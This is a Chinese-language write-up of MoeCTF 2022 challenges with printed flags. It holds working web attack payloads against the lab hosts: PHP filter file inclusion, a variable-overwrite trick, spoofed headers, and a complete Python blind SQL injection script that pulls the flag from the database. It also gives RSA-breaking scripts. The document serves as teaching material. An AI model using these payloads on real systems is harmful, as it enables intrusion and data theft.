# MoeCTF 2022

## Web

### baby\_file

#### 题目

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
?>
```

#### 解题

这题是简单的文件包含，先用 dirsearch 扫描一下。

```bash
$ python dirsearch.py -u http://node2.anna.nssctf.cn:28169/
```

可以扫描到 `/flag.php` ，通过构造以下 Payload

```url
file=php://filter/read=convert.base64-encode/resource=flag.php
```

可以获得到 `flag.php` 的源码

```php
<?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;
NSSCTF{b3333432-7dff-4ca8-b6f4-cd4bd5fc6688};
?>
```

### ezhtml

通过 `右键 - 查看网页源代码` 寻找答案没有结果，发现底下有个 `evil.js` ，访问该文件可以得到 flag 力！

### what are y0u uploading？

随便提交一个图片可以得到以下回显

```html
文件上传成功！filename：fea5445634569c851f2933f11259cc92.png
我不想要这个特洛伊文件，给我一个f1ag.php 我就给你flag!
```

通过修改 Request 中的 `filename` 为 `f1ag.php` 即可得到 flag 了。

<figure><img src=".gitbook/assets/what_are_y0u_uploading？-1.png" alt=""><figcaption></figcaption></figure>

### ezphp

先来分析源码\~

```php
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';

// $_GET['flag'] 和 $_POST['flag'] 至少存在一个
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}

// $_GET['flag'] 和 $_POST['flag'] 至少一个值为 flag
if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}

//将 value 的值赋给 $key
foreach ($_POST as $key => $value) {
    $$key = $value;
}

//将 $value 的值赋给 $key
foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>
```

分析结束后，通过构造以下 Payload

```
test=flag&flag=test
```

就可以获得到 flag 了，原理是先将 test 的值复制 flag 的值，又因为必须存在一个 `$_GET['flag'] === 'flag'` ，因此将 flag 的值改为 test 的值就可以了。

### Sqlmap\_boy

查看网站源代码可以发现

```html
<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
```

通过访问 `http://node2.anna.nssctf.cn:28497/login.php` 回显

```json
{
	code: "0",
	message: "用户名或密码错误"
}
```

应该可以推断为布尔注入，通过编写以下代码

```python
import time
import requests

url = 'http://node2.anna.nssctf.cn:28497/login.php'
session = requests.Session()
def getDatabase():
    results = []
    for i in range(1000):
        print(f'{i}...')
        start = -1
        end = 255
        mid = -1
        while start < end:
            mid = (start + end) // 2
            params = {"username": f'admin" and (ascii(substr(database(),{i+1},1))>{mid})#'}
            ret = session.post(url, data=params)
            if '"code":"1"' in ret.text:
                start = mid + 1
            else:
                end = mid
            time.sleep(0.05)
        if mid == -1:
            break
        results.append(chr(start))
        print(''.join(results))
    return ''.join(results)

begin = time.time()
getDatabase()
print(f'time spend: {time.time() - begin}')
```

可以得到数据库名为 `moectf` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="moectf" limit 0,1),{i+1},1))>{mid})#'}
```

可以得到数据库表 `articles,flag,users` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema="moectf" and table_name="flag"),{i+1},1))>{mid})#'}
```

可以得到列名 `flAg` ，通过修改上面代码中的变量 params 成如下内容

```python
params = {"username": f'admin" and (ascii(substr((select flAg from flag limit 0, 1),{i+1},1))>{mid})#'}
```

就可以得到 flag 力！

### cookiehead

题目包含 cookie ，那就是 Cookies 里面一探究竟！

首先打开题目后到达第一关 `仅限本地访问` ，用 HackBar 添加 Header

```http
X-Forwarded-For: 127.0.0.1
```

之后提示 `请先登录` ，将 Cookies 修改成 `login=1` 即可。

最后一关 `You are not from http://127.0.0.1/index.php !` 则添加 Header

```http
Referer: http://127.0.0.1/index.php
```

就可以得到 flag 啦！

### God\_of\_aim

右键查看源代码可以得到提示

```html
<!-- 你知道吗？index.js实例化了一个aimTrainer对象-->
```

可以在 `aimtrainer.js` 文件中发现 `checkflag1()` 和 `checkflag2()` 函数，在 Console 输入 `_0x78bd` 可以得到回显

```js
['aimTrainerEl', 'aim-trainer', 'getElementById', 'scoreEl', 'score', 'aimscore', 'delay', 'targetSize', 'aimscoreEL', 'setScore', 'start', 'innerHTML', 'setAimScore', 'position', 'style', 'relative', 'timer', 'createTarget', 'checkflag1', 'checkflag2', 'stop', 'moectf{Oh_you_can_a1m_', '你已经学会瞄准了！试试看:', 'start2', 'and_H4ck_Javascript}', '']
```

就可以得到 flag `moectf{Oh_you_can_a1m_and_H4ck_Javascript}` 了！

## Reverse

### Reverse入门指北

flag 就在指北最底下，好耶，是指北！

### checkin

使用 IDA 打开后就可以发现 flag 力！

### Hex

使用 010 Editor 打开 `Hex.exe` 后搜索 `moectf` 可以发现 flag

<figure><img src=".gitbook/assets/Hex-1.png" alt=""><figcaption></figcaption></figure>

### Base

使用 IDA 打开后对着 `main` F5 就可以发现 base64 加密内容

```
1wX/yRrA4RfR2wj72Qv52x3L5qa=
```

并且在 `main` 中还可以发现一个符号表

```
abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

通过 CyberChef 一把梭可以得到 flag `moectf{qwqbase_qwq}`

### begin

使用 IDA 打开后对着 `main` F5 就可以发现

```c
for ( i = 0; i < strlen(Str); ++i )
    Str[i] ^= 0x19u;
if ( !strcmp(Str, Str2) )
    puts("\nGood job!!! You know how to decode my flag by xor!");
else
    puts("\nQwQ. Something wrong. Please try again. >_<");
```

通过分析以上代码可以发现需要对每个字符与 `0x19` 进行异或运算，若和 `Str2` 比对完全一致则弹出正确，通过双击也可以发现 `Str2` 的内容。

<figure><img src=".gitbook/assets/Base-1.png" alt=""><figcaption></figcaption></figure>

整理内容可以得到一个数组

```python
arr = [0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B,
       0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D,
       0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38,
       0x38, 0x38, 0x38, 0x64]
```

编写 Python 代码对数组内容进行异或运算并且转为字符就可以得到 flag 了。

```python
arr = [0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B,
       0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D,
       0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38,
       0x38, 0x38, 0x38, 0x64]

flag = ''
for ch in arr:
    flag += chr(ch ^ 0x19)
print(flag)

# moectf{X0r_1s_s0_int3r3sting!!!!!}
```

## Pwn

### shell

```bash
$ nc node3.anna.nssctf.cn 28646
Welcome to PWN world!
In PWN, your goal is to get shell.
Here I'll give you the shell as a gift for our first meeting.
Have fun in the following trip!
cat flag
NSSCTF{765b5608-08aa-4876-b917-05a4129cf665}
```

## Crypto

### vigenere

https://www.guballa.de/vigenere-solver

```
6. i won't tell you that the flag is moectf attacking the vigenere cipher is interesting
```

解码后就可以得到 flag `moectf{attacking_the_vigenere_cipher_is_interesting}` 了

### 0rsa0

#### 第一关

打开文件后可以看到 `e1=3` ，可以使用低加密指数攻击。

```python
from Crypto.Util.number import *
from gmpy2 import iroot

c = 1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n = 133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707

i = 0
while 1:
    if iroot(c + i * n, 3)[1] == 1:
        m = iroot(c + i * n, 3)[0]
        print(long_to_bytes(m))
        break
    i = i + 1
```

通过低加密指数攻击可以得到明文 `T8uus_23jkjw_asr`

#### 第二关

可以发现存在 dp 泄露，因此可以通过泄露的 dp 进行攻击。

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import *

e = 65537
n = 159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
dp = 947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
c = 37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306

for i in range(1, e):
    if (dp * e - 1) % i == 0:
        if n % (((dp * e - 1) // i) + 1) == 0:
            p = ((dp * e - 1) // i) + 1
            q = n // (((dp * e - 1) // i) + 1)
            phi = (q - 1) * (p - 1)
            d = invert(e, phi)
            m = pow(c, d, n)
            print(long_to_bytes(m))
            break
```

通过 dp 泄露攻击可以得到明文 `_3d32awd!5f&#@sd`

所以 flag 就是 `moectf{T8uus_23jkjw_asr_3d32awd!5f&#@sd}`

### Signin

这道题的 phi 与 e 并不互素，尝试用 `gmpy2.invert(e, q - 1)` 不行，用 `d = gmpy2.invert(e, p - 1)` 可以。

```python
import gmpy2
from Crypto.Util.number import *

e = 65537
p = 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073
q = 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379
c = 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595
phi = (q - 1) * (p - 1)
d = gmpy2.invert(e, p - 1)
n = p * q

m = pow(c, d, p)

print(long_to_bytes(m))
# moectf{Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!}
```

###
